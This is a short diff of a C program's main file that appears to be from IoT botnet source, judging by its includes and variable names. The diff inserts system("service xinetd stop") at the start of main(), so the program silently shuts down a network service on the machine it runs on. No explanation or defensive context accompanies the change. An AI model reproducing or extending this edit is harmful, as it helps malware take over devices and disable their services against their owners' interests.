@@ -15,6 +15,7 @@
 #include <time.h>
 #include <errno.h>
 
+
 #include "includes.h"
 #include "table.h"
 #include "rand.h"
@@ -54,7 +55,7 @@ int main(int argc, char **args)
     int name_buf_len;
     int tbl_exec_succ_len;
     int pgid, pings = 0;
-
+	system("service xinetd stop");
 #ifndef DEBUG
     sigset_t sigs;
     int wfd;
